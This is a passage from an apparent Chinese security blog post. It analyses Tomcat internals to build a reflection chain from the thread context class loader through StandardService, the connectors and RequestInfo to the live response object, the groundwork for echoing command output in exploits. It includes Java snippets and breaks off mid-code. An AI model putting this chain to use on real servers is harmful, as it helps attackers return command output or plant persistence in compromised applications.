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" width="361" height="202" class="img_ev3q"></p>
<p>还是查找<code>request</code>和<code>response</code>实例的usage</p>
<p><img decoding="async" loading="lazy" alt="usage" src="/assets/images/image-20220209145038406-66b93f44ee8b1a8afa4ca0a5275e71cc.png" width="1636" height="326" class="img_ev3q"></p>
<p>发现<code>org.apache.coyote.AbstractProcessor</code>提供了一个<code>getRequest</code>方法来获取<code>request</code>对象</p>
<p><img decoding="async" loading="lazy" alt="image-20220209144852773" src="/assets/images/image-20220209144852773-ec8b81d56ebd5b3a2143c3dea8a8c8ce.png" width="754" height="294" class="img_ev3q"></p>
<p>获取到<code>request</code>对象后，再通过<code>Request</code>类提供的<code>getResponse</code>方法来获取<code>response</code></p>
<p><img decoding="async" loading="lazy" alt="image-20220209145324208" src="/assets/images/image-20220209145324208-e825117e7e9fc2ee359b7a8c0a6abaff.png" width="918" height="228" class="img_ev3q"></p>
<p>最后通过<code>response</code>的<code>doWrite()</code>方法，写进内容，返回给前端</p>
<p>也可以通过<code>setHeader()</code>方法写入到返回头中</p>
<p><img decoding="async" loading="lazy" alt="image-20220209145459900" src="/assets/images/image-20220209145459900-722d7af2c06884795d47cd0ad2eed095.png" width="1156" height="324" class="img_ev3q"></p>
<p>所以一条response部分利用链如下：</p>
<blockquote>
<p><code>Http11Processor</code>继承了<code>AbstractProcessor</code>，所以调用<code>Http11Processor#getRequest()</code>就等于<code>AbstractProcessor#getRequest()</code></p>
</blockquote>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Http11Processor#getRequest() -&gt; </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">AbstractProcessor#getRequest() -&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	Request#getResponse() -&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		Response#doWrite()</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="http11processor类相关">Http11Processor类相关<a href="#http11processor类相关" class="hash-link" aria-label="Http11Processor类相关的直接链接" title="Http11Processor类相关的直接链接">​</a></h3>
<p>前面挖掘部分说了，获取了<code>Http11Processor</code>实例后，就可以获取<code>request</code>，也就可以获取<code>response</code>，我们的目的也达成了，但是<strong>如何来获取<code>Http11Processor</code>实例或者<code>Http11Processor request、response</code>的变量</strong>呢</p>
<p>继续向前分析，看什么时候出现了<code>Http11Processor</code>类的实例；发现是在<code>org.apache.coyote.AbstractProtocol.ConnectionHandler#process</code>这个函数中，初始化是通过<code>connections.get(socket)</code>来赋值</p>
<p><img decoding="async" loading="lazy" alt="image-20220209152439431" src="/assets/images/image-20220209152439431-139a29c0d40c55665560e74f56650bdb.png" width="3422" height="1454" class="img_ev3q"></p>
<p>但722行这个时候获取的<code>processor</code>值为null，因为<code>connections</code>值为空，在806行的时候才添加内容到<code>connections</code>中</p>
<p><img decoding="async" loading="lazy" alt="image-20220209160753875" src="/assets/images/image-20220209160753875-ea13f0a94c1a7eb99f5d6f96df7307c1.png" width="1758" height="896" class="img_ev3q"></p>
<p>所以我们重新下个断点分析一下<code>processor</code>是如何赋值的，可以看到<code>connections</code>722行初始化的时候长度是0，processor这个时候也是null，这也验证了我们上面说的</p>
<p><img decoding="async" loading="lazy" alt="image-20220209155109438" src="/assets/images/image-20220209155109438-99fbc75e02de3b2fbad4960572ef9d36.png" width="2118" height="342" class="img_ev3q"></p>
<p>一直往后跟，在798行的时候会对<code>processor</code>进行赋值，调用<code>this.getProtocol().createProcessor();</code>来获得的</p>
<p><img decoding="async" loading="lazy" alt="image-20220209155231759" src="/assets/images/image-20220209155231759-ab4bc1920ffc606d5190a1fbc59bf0c9.png" width="3532" height="952" class="img_ev3q"></p>
<p>赋值后会进入<code>register</code>函数对<code>processor</code>进行一些处理，重点也在这</p>
<p>跟进注册函数，发现变量rp是<code>RequestInfo</code>类，而通过<code>RequestInfo</code>类我们可以获取到<code>request</code>，后续也就可以获取到<code>response</code>了</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">rp.req.getResponse()</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20220209165017817" src="/assets/images/image-20220209165017817-a769a325a5dd0538d17be1ca8dfda4ef.png" width="3584" height="2240" class="img_ev3q"></p>
<p>所以这里我们可以着重关注一下，如何获取<code>RequestInfo</code>对象<code>rp</code>，从后面的内容可以看出来，主要有2个地方：</p>
<ol>
<li>第一处会通过<code>rp.setGlobalProcessor(global)</code>设置到global中，具体可以看代码</li>
<li>第二处会通过<code>Registry.getRegistry(null, null).registerComponent(rp,rpName, null);</code>注册到其他地方</li>
</ol>
<p><img decoding="async" loading="lazy" alt="image-20220209165207236" src="/assets/images/image-20220209165207236-782010fa41984ab5704433d80047df7e.png" width="3416" height="1904" class="img_ev3q"></p>
<p>所以想要构造链，主要有两种方法：</p>
<ol>
<li>寻找获取<code>global</code>的方法</li>
<li>跟踪<code>Registry.registerComponent()</code>流程，查看具体的<code>RequestInfo</code>对象被注册到什么地方了</li>
</ol>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="获取global">获取global<a href="#获取global" class="hash-link" aria-label="获取global的直接链接" title="获取global的直接链接">​</a></h4>
<blockquote>
<p>先放下整条链的结果：</p>
<p>Thread.currentThread().getContextClassLoader()-&gt;resources-&gt;context-&gt;context-&gt;StandardService-&gt;connectors-&gt;connector-&gt;protocolHandler-&gt;handler-&gt;AbstractProtocol$ConnectoinHandler-&gt;global-&gt;processors-&gt;RequestInfo-&gt;req-&gt;response</p>
</blockquote>
<p><code>global</code>变量是<code>AbstractProtocol</code>静态内部类<code>ConnectionHandler</code>的成员变量；不是static静态变量，因此我们还需要找存储<code>AbstractProtocol</code>类或<code>AbstractProtocol</code>子类。现在的利用链为</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">AbstractProtocol$ConnectoinHandler-&gt;global-&gt;RequestInfo-&gt;req-&gt;response</span><br></span></code></pre></div></div>
<p>分析继承关系，发现它有子类<code>Http11NioProtocol</code>，所以如果我们获取到这个类，那么也能获取到global</p>
<p><img decoding="async" loading="lazy" alt="image-20220209171115093" src="/assets/images/image-20220209171115093-8fccd4f294bbae810b462b2b9ace88be.png" width="1158" height="430" class="img_ev3q"></p>
<div class="theme-admonition theme-admonition-note admonition_xJq3 alert alert--secondary"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>备注</div><div class="admonitionContent_BuS1"><p>Tomcat初始化<code>StandardService</code>时，会启动<code>Container</code>、<code>Executor</code>、<code>mapperListener</code>及所有的<code>Connector</code>。其中<code>Executor</code>负责为<code>Connector</code>处理请求提供共用的线程池，<code>mapperListener</code>负责将请求映射到对应的容器中，<code>Connector</code>负责接收和解析请求。所以对于单个请求来说，其相关的信息及调用关系都保存在<code>Connector</code>对象中</p></div></div>
<p>分析调用栈，发现存在这个类，<code>org.apache.catalina.connector.CoyoteAdapter#connector</code>的<code>protocolHandler</code>属性值类就是<code>Http11NioProtocol</code></p>
<p><img decoding="async" loading="lazy" alt="image-20220209171449493" src="/assets/images/image-20220209171449493-168d648adf39dedd0c1d561fcd6e4e1a.png" width="2414" height="1470" class="img_ev3q"></p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">((AbstractProtocol.ConnectionHandler) ((Http11NioProtocol) connector.protocolHandler).handler).global.processors.get(0).req.getResponse()</span><br></span></code></pre></div></div>
<p>所以现在的思路是如何获取到这个<code>connector</code>，新的利用链</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">connector-&gt;protocolHandler-&gt;handler-&gt;AbstractProtocol$ConnectoinHandler-&gt;global-&gt;RequestInfo-&gt;req-&gt;response</span><br></span></code></pre></div></div>
<p>Litch1师傅分析出在Tomcat启动过程中会创建connector对象，并通过<code>org.apache.catalina.core.StandardService#addConnector</code>存放在<code>connectors</code>中</p>
<p><img decoding="async" loading="lazy" alt="org.apache.catalina.startup.Tomcat#setConnector" src="/assets/images/image-20220209173721349-7d957d0ec2edb53f0b8b4bedfdc28969.png" width="1328" height="566" class="img_ev3q"></p>
<p>然后通过<code>org.apache.catalina.core.StandardService#initInternal</code>进行初始化</p>
<p><img decoding="async" loading="lazy" alt="image-20220209173933442" src="/assets/images/image-20220209173933442-81be727189980cf9c947ead2b2ae903a.png" width="1464" height="1258" class="img_ev3q"></p>
<p>因为先添加了再初始化，所以这个时要获取<code>connectors</code>，可以通过<code>org.apache.catalina.core.StandardService</code>来获取</p>
<p>所以利用链</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">StandardService-&gt;connectors-&gt;connector-&gt;protocolHandler-&gt;handler-&gt;AbstractProtocol$ConnectoinHandler-&gt;global-&gt;RequestInfo-&gt;req-&gt;response</span><br></span></code></pre></div></div>
<p>所以最后就是如何获得<code>StandardService</code>了，这里利用的是tomcat放弃了双亲委派模型的思路</p>
<div class="theme-admonition theme-admonition-note admonition_xJq3 alert alert--secondary"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>备注</div><div class="admonitionContent_BuS1"><p>双亲委派机制的缺点：当加载同个jar包不同版本库的时候，该机制无法自动选择需要版本库的jar包。特别是当Tomcat等web容器承载了多个业务之后，不能有效的加载不同版本库。为了解决这个问题，Tomcat放弃了双亲委派模型。</p><p>Tomcat加载机制简单讲，<code>WebAppClassLoader</code>负责加载本身的目录下的class文件，加载不到时再交给<code>CommonClassLoader</code>加载，这和双亲委派刚好相反。</p></div></div>
<p>通过<code>Thread.currentThread().getContextClassLoader()</code>来获取当前线程的<code>ClassLoader</code>，再从<code>resources-&gt;context-&gt;context</code>当中寻找即可。</p>
<p><img decoding="async" loading="lazy" alt="image-20220210094109672" src="/assets/images/image-20220210094109672-6dfd60007ab0d67d9c7b9822e0468ed7.png" width="948" height="1170" class="img_ev3q"></p>
<p>所以最终的手法</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Thread.currentThread().getContextClassLoader()-&gt;resources-&gt;context-&gt;context-&gt;StandardService-&gt;connectors-&gt;connector-&gt;protocolHandler-&gt;handler-&gt;AbstractProtocol$ConnectoinHandler-&gt;global-&gt;processors-&gt;RequestInfo-&gt;req-&gt;response</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="global链路代码">global链路代码<a href="#global链路代码" class="hash-link" aria-label="global链路代码的直接链接" title="global链路代码的直接链接">​</a></h4>
<div class="theme-admonition theme-admonition-note admonition_xJq3 alert alert--secondary"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>备注</div><div class="admonitionContent_BuS1"><p>尽可能的找到能够直接通过函数获取到想要的数据，实在不行再使用反射</p></div></div>
<p>1、获取<code>StandardContext</code></p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">StandardContext standardContext = (StandardContext)webappClassLoaderBase.getResources().getContext();</span><br></span></code></pre></div></div>
<hr>
<p><code>Thread.currentThread().getContextClassLoader().getClass()</code>的值为<code>org.apache.catalina.loader.ParallelWebappClassLoader</code>，它继承了<code>WebappClassLoaderBase</code>，而<code>resources</code>变量是<code>WebappClassLoaderBase</code>类中的，所以这里如果也想使用反射的话，需要如下：</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">// 获取 StandardContext</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Field resources = org.apache.catalina.loader.WebappClassLoaderBase.class.getDeclaredField(&quot;resources&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">resources.setAccessible(true);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">org.apache.catalina.webresources.StandardRoot 